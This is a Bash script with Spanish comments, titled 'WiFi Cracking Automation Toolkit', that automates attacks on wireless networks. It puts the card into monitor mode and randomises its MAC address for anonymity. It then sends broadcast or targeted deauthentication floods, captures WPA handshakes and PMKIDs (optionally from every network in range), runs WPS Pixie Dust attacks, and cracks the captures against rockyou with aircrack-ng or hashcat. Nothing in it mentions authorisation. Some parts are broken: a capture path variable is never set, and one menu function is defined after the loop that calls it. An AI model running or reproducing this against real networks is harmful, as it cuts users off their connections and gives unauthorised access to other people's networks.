#!/bin/bash

# Colores para el output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Directorio de trabajo predeterminado
WORK_DIR="$(pwd)/capturas"
mkdir -p "$WORK_DIR"

# Verificar permisos de root
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[!] Por favor, ejecuta este script como root.${NC}"
  exit 1
fi

function check_dependencies() {
    clear
    echo -e "${YELLOW}[*] Verificando dependencias del sistema...${NC}"
    echo "========================================="
    
    # Lista de herramientas críticas y sus paquetes correspondientes
    # Formato: "herramienta:paquete"
    dependencies=(
        "airmon-ng:aircrack-ng"
        "airodump-ng:aircrack-ng"
        "aireplay-ng:aircrack-ng"
        "aircrack-ng:aircrack-ng"
        "hashcat:hashcat"
        "iwconfig:wireless-tools"
        "iw:iw"
        "wget:wget"
        "wash:reaver"
        "bully:bully"
        "hcxdumptool:hcxtools"
        "macchanger:macchanger"
        "cowpatty:cowpatty"
    )

    for item in "${dependencies[@]}"; do
        tool="${item%%:*}"
        package="${item##*:}"

        if ! command -v "$tool" &> /dev/null; then
            echo -e "${RED}[!] La herramienta '$tool' no está instalada.${NC}"
            read -p "¿Deseas instalar el paquete '$package'? (s/n): " choice
            if [[ "$choice" == "s" || "$choice" == "S" ]]; then
                echo -e "${YELLOW}[*] Actualizando e instalando $package...${NC}"
                apt-get update && apt-get install -y "$package"
                if ! command -v "$tool" &> /dev/null; then
                    echo -e "${RED}[!] Falló la instalación de $package. Saliendo...${NC}"
                    exit 1
                fi
                echo -e "${GREEN}[+] $package instalado correctamente.${NC}"
            else
                echo -e "${RED}[!] Se requiere '$tool' para continuar. Saliendo...${NC}"
                exit 1
            fi
        else
            echo -e "${GREEN}[OK] $tool encontrado.${NC}"
        fi
    done

    # Verificación opcional para hcxtools
    if ! command -v hcxpcapngtool &> /dev/null; then
        echo -e "${YELLOW}[INFO] 'hcxpcapngtool' no encontrado (útil para convertir .cap a hashcat).${NC}"
        read -p "¿Deseas instalar 'hcxtools' (opcional)? (s/n): " choice
        if [[ "$choice" == "s" || "$choice" == "S" ]]; then
             apt-get update && apt-get install -y hcxtools
        fi
    else
        echo -e "${GREEN}[OK] hcxpcapngtool encontrado.${NC}"
    fi

    echo -e "${GREEN}[*] Todas las dependencias están listas.${NC}"
    sleep 2
}

function banner() {
    clear
    echo -e "${GREEN}"
    echo "========================================="
    echo "     WiFi Cracking Automation Toolkit"
    echo "========================================="
    echo -e "${NC}"
}

function check_monitor_support() {
    local iface=$1
    if [ -z "$iface" ]; then return; fi

    echo -e "${YELLOW}[*] Verificando soporte de modo monitor para $iface...${NC}"

    # Obtener índice PHY
    local output=$(iw dev "$iface" info 2>/dev/null)
    local phy=$(echo "$output" | grep "wiphy" | awk '{print $2}')

    if [ -z "$phy" ]; then
        echo -e "${RED}[!] No se pudo obtener información del hardware para $iface.${NC}"
        # No bloqueamos, solo avisamos
        return
    fi

    # Verificar soporte en el hardware físico
    if iw phy "phy$phy" info 2>/dev/null | grep -q "monitor"; then
        echo -e "${GREEN}[OK] La interfaz soporta modo monitor.${NC}"
    else
        echo -e "${RED}[!] ALERTA: La interfaz '$iface' NO parece soportar modo monitor.${NC}"
        echo -e "${YELLOW}[!] Sin esto, el script fallará.${NC}"
        read -p "¿Deseas continuar de todos modos? (s/n): " choice
        if [[ "$choice" != "s" && "$choice" != "S" ]]; then exit 1; fi
    fi
}

function run_in_new_terminal() {
    local cmd="$1"
    local title="$2"
    
    echo -e "${YELLOW}[*] Abriendo ventana auxiliar para: $title...${NC}"
    
    # Intentar detectar emuladores de terminal comunes en Kali/Linux
    if command -v x-terminal-emulator > /dev/null 2>&1; then
        x-terminal-emulator -e "bash -c '$cmd; exec bash'" &
    elif command -v qterminal > /dev/null 2>&1; then
        qterminal -e "bash -c '$cmd; exec bash'" &
    elif command -v gnome-terminal > /dev/null 2>&1; then
        gnome-terminal -- bash -c "$cmd; exec bash" &
    elif command -v xfce4-terminal > /dev/null 2>&1; then
        xfce4-terminal -e "bash -c '$cmd; exec bash'" &
    elif command -v xterm > /dev/null 2>&1; then
        xterm -title "$title" -e "bash -c '$cmd; exec bash'" &
    else
        echo -e "${RED}[!] No se pudo abrir una nueva terminal automáticamente.${NC}"
        echo -e "${YELLOW}[*] Ejecutando en segundo plano (background)...${NC}"
        eval "$cmd" &
    fi
}

function check_interface() {
    echo -e "${YELLOW}[*] Listando interfaces inalámbricas...${NC}"
    airmon-ng
    echo ""
    read -p "Ingresa el nombre de tu interfaz inalámbrica (ej. wlan0): " interface
    check_monitor_support "$interface"
}

function ensure_mon_interface() {
    if [ -z "$mon_interface" ]; then
        read -p "Ingresa el nombre de la interfaz en modo monitor (ej. wlan0mon): " mon_interface
    fi
}

function start_monitor_mode() {
    banner
    check_interface
    echo -e "${YELLOW}[*] Iniciando modo monitor en $interface...${NC}"
    airmon-ng start "$interface"
    
    echo -e "${GREEN}[+] Modo monitor activado.${NC}"
    read -p "Ingresa el nombre de la interfaz en modo monitor (ej. wlan0mon): " mon_interface
    
    echo -e "${YELLOW}[*] Cambiando dirección MAC (Anónimo)...${NC}"
    ifconfig "$mon_interface" down
    macchanger -r "$mon_interface"
    ifconfig "$mon_interface" up
    
    echo -e "${YELLOW}[*] Verificando con iwconfig...${NC}"
    iwconfig "$mon_interface"
    read -p "Presiona Enter para continuar..."
}

function stop_monitor_mode() {
    banner
    read -p "Ingresa el nombre de la interfaz en modo monitor a detener (ej. wlan0mon): " mon_interface
    echo -e "${YELLOW}[*] Deteniendo modo monitor...${NC}"
    airmon-ng stop "$mon_interface"
    echo -e "${GREEN}[+] Modo monitor detenido.${NC}"
    echo -e "${YELLOW}[*] Reiniciando NetworkManager...${NC}"
    service NetworkManager restart
    read -p "Presiona Enter para continuar..."
}

function scan_networks() {
    banner
    ensure_mon_interface
    echo -e "${YELLOW}[*] Iniciando escaneo de redes. Presiona CTRL+C para detener cuando veas el objetivo.${NC}"
    echo -e "${YELLOW}[*] Copia el BSSID y el CANAL (CH) de tu objetivo.${NC}"
    read -p "Presiona Enter para comenzar..."
    airodump-ng "$mon_interface"
}

function capture_handshake() {
    banner
    ensure_mon_interface
    
    read -p "Ingresa el BSSID del objetivo: " bssid
    read -p "Ingresa el CANAL del objetivo: " channel
    read -p "Ingresa un nombre para el archivo de captura (sin extension): " filename
    
    echo -e "${YELLOW}[*] Iniciando captura en canal $channel para BSSID $bssid...${NC}"
    echo -e "${YELLOW}[*] Los archivos se guardarán en: $full_cap_path${NC}"
    
    # MODO AUTOMATICO IMPLICITO
    # Comando para airodump (se ejecutará en ventana externa)
    airodump_cmd="airodump-ng -c $channel --bssid $bssid -w $full_cap_path $mon_interface"
    
    run_in_new_terminal "$airodump_cmd" "Capturando Handshake - $bssid"
    
    echo -e "${YELLOW}[*] Esperando 5 segundos para iniciar desautenticación...${NC}"
    sleep 5
    
    # Bucle de ataque
    while true; do
        echo -e "\n${RED}[ATTACK] Lanzando 5 paquetes de desautenticación masiva...${NC}"
        aireplay-ng -0 5 -a "$bssid" "$mon_interface"
        
        echo -e "${YELLOW}[?] Mira la OTRA VENTANA.${NC}"
        read -p "¿Ya apareció 'WPA Handshake' arriba a la derecha? (s = Sí, detener / n = Atacar de nuevo): " captured
        
        if [[ "$captured" == "s" || "$captured" == "S" ]]; then
            echo -e "${GREEN}[*] Deteniendo captura...${NC}"
            pkill -f "airodump-ng.*$bssid"
            
            # Verificar handshake automáticamente
            echo -e "${YELLOW}[*] Verificando handshake capturado...${NC}"
            if aircrack-ng -b "$bssid" "$full_cap_path-01.cap" 2>&1 | grep -q "1 handshake"; then
                 echo -e "${GREEN}[OK] Handshake VÁLIDO.${NC}"
                 read -p "¿Quieres intentar crackearlo ahora mismo? (s/n): " crack_now
                 if [[ "$crack_now" == "s" || "$crack_now" == "S" ]]; then
                     crack_password_auto "$full_cap_path-01.cap" "$bssid"
                 fi
            else
                 echo -e "${RED}[!] El handshake parece inválido o incompleto.${NC}"
            fi
            break
        else
            echo -e "${YELLOW}[*] Reintentando ataque en 2 segundos...${NC}"
            sleep 2
        fi
    done
}

function deauth_attack() {
    banner
    ensure_mon_interface
    
    read -p "Ingresa el BSSID del Router objetivo: " bssid
    read -p "Ingresa el BSSID del Cliente (o déjalo vacío para broadcast): " client
    read -p "Cantidad de paquetes de desautenticación (ej. 10): " packets
    
    if [ -z "$client" ]; then
        echo -e "${YELLOW}[*] Iniciando ataque de desautenticación BROADCAST...${NC}"
        aireplay-ng -0 "$packets" -a "$bssid" "$mon_interface"
    else
        echo -e "${YELLOW}[*] Iniciando ataque de desautenticación dirigido al cliente $client...${NC}"
        aireplay-ng -0 "$packets" -a "$bssid" -c "$client" "$mon_interface"
    fi
    read -p "Presiona Enter para continuar..."
}

function wps_attack() {
    banner
    ensure_mon_interface

    echo -e "${YELLOW}[*] Buscando redes con WPS activado (Presiona CTRL+C para detener)...${NC}"
    echo -e "${YELLOW}[*] Busca columnas 'Lck' (No) y 'WPS' (version).${NC}"
    read -p "Presiona Enter para escanear..."
    
    # wash scan
    wash -i "$mon_interface"
    
    echo ""
    read -p "Ingresa el BSSID del objetivo: " bssid
    read -p "Ingresa el Canal (CH): " channel
    
    echo -e "${YELLOW}[*] Iniciando ataque Pixie Dust con Bully...${NC}"
    # -d: Pixie Dust, -B: Brute force fallback (opcional), -v 3: verbosity
    bully -b "$bssid" -c "$channel" -d -v 3 "$mon_interface"
    
    read -p "Presiona Enter para continuar..."
}

function pmkid_attack() {
    banner
    ensure_mon_interface
    
    echo -e "${YELLOW}[*] Ataque PMKID (Client-less)${NC}"
    echo -e "Este ataque captura el PMKID directamente del Router sin necesitar usuarios conectados."
    echo -e "Se usará 'hcxdumptool' para atacar el objetivo por unos segundos."

    read -p "Ingresa el BSSID del objetivo (o déjalo vacío para atacar TODO): " target_bssid
    read -p "Tiempo de captura en segundos (ej. 60): " capture_time
    dump_file="$WORK_DIR/pmkid_capture_$(date +%s).pcapng"
    
    echo -e "${YELLOW}[*] Iniciando captura... espera $capture_time segundos.${NC}"
    
    F_OPT=""
    if [ ! -z "$target_bssid" ]; then
        # Crear filtro para hcxdumptool
        echo "$target_bssid" | sed 's/://g' > filter.txt
        F_OPT="--filterlist_ap=filter.txt --enable_status=1"
    fi
    
    # hcxdumptool puede ser agresivo.
    timeout "$capture_time" hcxdumptool -i "$mon_interface" -w "$dump_file" $F_OPT
    
    echo -e "\n${GREEN}[+] Captura finalizada.${NC}"
    
    if [ -f "$dump_file" ]; then
        echo -e "${YELLOW}[*] Buscando PMKID en la captura...${NC}"
        
        # Convertir y extraer
        hcxpcapngtool -o "${dump_file}.hc22000" "$dump_file"
        
        if [ -f "${dump_file}.hc22000" ]; then
            echo -e "${GREEN}[!!!] ÉXITO: Se han extraído hashes PMKID.${NC}"
            echo -e "Archivo guardado en: ${dump_file}.hc22000"
            
            read -p "¿Quieres intentar crackearlo ahora mismo? (s/n): " crack_now
            if [[ "$crack_now" == "s" || "$crack_now" == "S" ]]; then
                 # Para PMKID, pasamos el archivo convertido (hc22000)
                 crack_password_auto "${dump_file}.hc22000" "PMKID"
            fi
        else
            echo -e "${RED}[!] No se encontraron PMKIDs válidos en esta captura.${NC}"
        fi
    else
        echo -e "${RED}[!] Error: No se generó el archivo de captura.${NC}"
    fi
    
    read -p "Presiona Enter para continuar..."
}

function crack_password_auto() {
    local cap_file_input="$1"
    local bssid_input="$2"
    
    echo -e "${YELLOW}[*] Configuración rápida de cracking...${NC}"
    
    # Selección rápida de diccionario (Prioriza RockYou local)
    wordlist=""
    if [ -f "$WORK_DIR/rockyou.txt" ]; then
        wordlist="$WORK_DIR/rockyou.txt"
    elif [ -f "/usr/share/wordlists/rockyou.txt" ]; then
        wordlist="/usr/share/wordlists/rockyou.txt"
    else
        echo -e "${RED}[!] No se encontró rockyou.txt automáticmente. Usando selección manual...${NC}"
        # Fallback a función manual si falla
        crack_password
        return
    fi
    
    echo -e "${GREEN}[*] Usando diccionario: $wordlist${NC}"
    
    # Decidir herramienta basado en extensión o tipo
    if [[ "$cap_file_input" == *.hc22000 ]]; then
        echo -e "${YELLOW}[*] Detectado Hashcat Mode (PMKID/Converted). Usando GPU...${NC}"
        hashcat -a 0 -m 22000 -w 3 "$cap_file_input" "$wordlist"
    else
        echo -e "${YELLOW}[*] Detectado Aircrack-ng Mode (Handshake). Usando CPU...${NC}"
        aircrack-ng -a2 -b "$bssid_input" -w "$wordlist" "$cap_file_input"
    fi
    read -p "Presiona Enter para continuar..."
}

function verify_handshake() {
    banner
    echo -e "${YELLOW}[*] Verificar integridad del Handshake${NC}"
    
    while true; do
        read -p "Ingresa la ruta del archivo .cap: " cap_file
        if [ -f "$cap_file" ]; then break; else echo -e "${RED}[!] Archivo no encontrado.${NC}"; fi
    done
    
    read -p "Ingresa el BSSID (opcional, Enter para omitir): " bssid
    
    echo -e "${YELLOW}[*] Analizando archivo con cowpatty...${NC}"
    
    # Cowpatty -c check only
    if [ -z "$bssid" ]; then
        cowpatty -c -r "$cap_file"
    else
        # Si se da BSSID, filtramos. Cowpatty necesita SSID (-s), pero usaremos aircrack -J para validar.
        # Mejor usamos aircrack-ng para un check rápido si tenemos BSSID
        echo -e "${YELLOW}[*] Usando aircrack-ng para validar handshake de $bssid...${NC}"
        output=$(aircrack-ng -b "$bssid" "$cap_file" 2>&1)
        if echo "$output" | grep -q "1 handshake"; then
             echo -e "${GREEN}[OK] Handshake VÁLIDO encontrado para $bssid.${NC}"
        else
             echo -e "${RED}[!] NO se detectó un handshake válido o completo.${NC}"
             echo "Salida de aircrack-ng:"
             echo "$output" | grep -E "handshake|No valid packets"
        fi
    fi
     
    read -p "Presiona Enter para continuar..."
}

function crack_password() {
    banner
    echo -e "${YELLOW}[*] Configuración del ataque de diccionario${NC}"
    
    # 1. Selección de Diccionario
    while true; do
        echo -e "\n${YELLOW}--- Selección de Diccionario ---${NC}"
        echo "1) Ingresar ruta manual"
        echo "2) Usar RockYou (Buscar en /usr/share/wordlists/)"
        echo "3) Descargar RockYou (desde GitHub)"
        read -p "Opción: " wl_choice

        case $wl_choice in
            1)
                read -p "Ruta del archivo: " wordlist
                if [ -f "$wordlist" ]; then break; else echo -e "${RED}[!] Archivo no encontrado.${NC}"; fi
                ;;
            2)
                # Intentar localizar rockyou en rutas comunes
                locations=(
                    "/usr/share/wordlists/rockyou.txt"
                    "/usr/share/wordlists/rockyou.txt.gz"
                )
                found=0
                for loc in "${locations[@]}"; do
                    if [ -f "$loc" ]; then
                        if [[ "$loc" == *.gz ]]; then
                            echo -e "${YELLOW}[*] Descomprimiendo $loc...${NC}"
                            gunzip -c "$loc" > "$WORK_DIR/rockyou.txt"
                            wordlist="$WORK_DIR/rockyou.txt"
                        else
                            wordlist="$loc"
                        fi
                        echo -e "${GREEN}[+] Diccionario seleccionado: $wordlist${NC}"
                        found=1
                        break
                    fi
                done
                
                if [ $found -eq 1 ]; then break; else echo -e "${RED}[!] RockYou no encontrado en rutas estándar.${NC}"; fi
                ;;
            3)
                wordlist="$WORK_DIR/rockyou.txt"
                echo -e "${YELLOW}[*] Descargando RockYou.txt...${NC}"
                if wget -q --show-progress -O "$wordlist" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt; then
                    echo -e "${GREEN}[+] Descarga completada: $wordlist${NC}"
                    break
                else
                    echo -e "${RED}[!] Error al descargar. Verifica tu conexión.${NC}"
                fi
                ;;
            *) echo "Opción inválida." ;;
        esac
    done

    # 2. Pedir archivo de captura (.cap)
    while true; do
        read -p "Ingresa la ruta del archivo de captura (.cap): " cap_file
        if [ -f "$cap_file" ]; then
            break
        else
            echo -e "${RED}[!] El archivo no existe. Intenta de nuevo.${NC}"
        fi
    done

    # 3. Menú de recursos
    echo ""
    echo "Selecciona el recurso para crackear:"
    echo "1) CPU (Aircrack-ng - Estándar)"
    echo "2) GPU (Hashcat - Alto Rendimiento)"
    read -p "Opción: " resource_opt

    case $resource_opt in
        1)
            echo -e "${YELLOW}[*] Necesitamos el BSSID para filtrar el ataque.${NC}"
            read -p "Ingresa el BSSID del objetivo: " bssid
            
            echo -e "${YELLOW}[*] Iniciando aircrack-ng con CPU...${NC}"
            echo -e "${RED}[!] IMPORTANTE: Solo funcionará si la contraseña está en tu diccionario.${NC}"
            aircrack-ng -a2 -b "$bssid" -w "$wordlist" "$cap_file"
            ;;
        2)
            echo -e "${YELLOW}[*] Preparando ataque con GPU (Hashcat)...${NC}"
            
            # Lógica de conversión
            hash_file=""
            if command -v hcxpcapngtool &> /dev/null; then
                 echo -e "${GREEN}[*] Herramienta 'hcxpcapngtool' detectada.${NC}"
                 output_hc="${cap_file%.*}.hc22000"
                 
                 echo -e "${YELLOW}[*] Convirtiendo .cap a formato hashcat (.hc22000)...${NC}"
                 hcxpcapngtool -o "$output_hc" "$cap_file"
                 
                 if [ -f "$output_hc" ]; then
                     echo -e "${GREEN}[+] Conversión exitosa: $output_hc${NC}"
                     hash_file="$output_hc"
                 else
                     echo -e "${RED}[!] Falló la conversión automática.${NC}"
                 fi
            else
                 echo -e "${YELLOW}[!] No se encontró 'hcxpcapngtool' para conversión automática.${NC}"
                 echo -e "${YELLOW}[!] Necesitas convertir el archivo .cap a .hc22000 manualmente (ej. https://hashcat.net/cap2hashcat/).${NC}"
            fi

            if [ -z "$hash_file" ]; then
                while true; do
                    read -p "Ingresa la ruta del archivo convertido (.hc22000): " hash_file
                    if [ -f "$hash_file" ]; then
                        break
                    else
                         echo -e "${RED}[!] Archivo no encontrado.${NC}"
                    fi
                done
            fi
            
            echo -e "${YELLOW}[*] Iniciando hashcat (Modo 22000)...${NC}"
            # -w 3 para alta carga de trabajo, ideal para GPU dedicada
            hashcat -a 0 -m 22000 -w 3 "$hash_file" "$wordlist"
            ;;
        *)
            echo "Opción inválida."
            ;;
    esac
    read -p "Presiona Enter para continuar..."
}

# Ejecutar verificación de dependencias al inicio
check_dependencies

while true; do
    banner
    echo "=========== ATTACK MENU ==========="
    echo "1) Ataque WPA/WPA2 Clásico (Handshake + Deauth)"
    echo "2) Ataque WPS (Pixie Dust)"
    echo "3) Ataque PMKID (Client-less)"
    echo "-----------------------------------"
    echo "4) Herramientas Extra (Crackear, Verificar, etc)"
    echo "5) Detener Modo Monitor y Salir"
    echo "6) Salir"
    
    read -p "Selecciona una opción: " option
    
    case $option in
        1) capture_handshake ;;
        2) wps_attack ;;
        3) pmkid_attack ;;
        4) extra_tools_menu ;;
        5) stop_monitor_mode; exit 0 ;;
        6) exit 0 ;;
        *) echo "Opción inválida"; sleep 1 ;;
    esac
done

function extra_tools_menu() {
    clear
    echo "=========== EXTRA TOOLS ==========="
    echo "1) Escanear Redes (airodump-ng)"
    echo "2) Ataque Desautenticación Manual"
    echo "3) Verificar Handshake (.cap)"
    echo "4) Crackear Contraseña (Manual)"
    echo "5) Volver"
    read -p "Opción: " ext_opt
    case $ext_opt in
        1) scan_networks ;;
        2) deauth_attack ;;
        3) verify_handshake ;;
        4) crack_password ;;
        5) return ;;
    esac
}
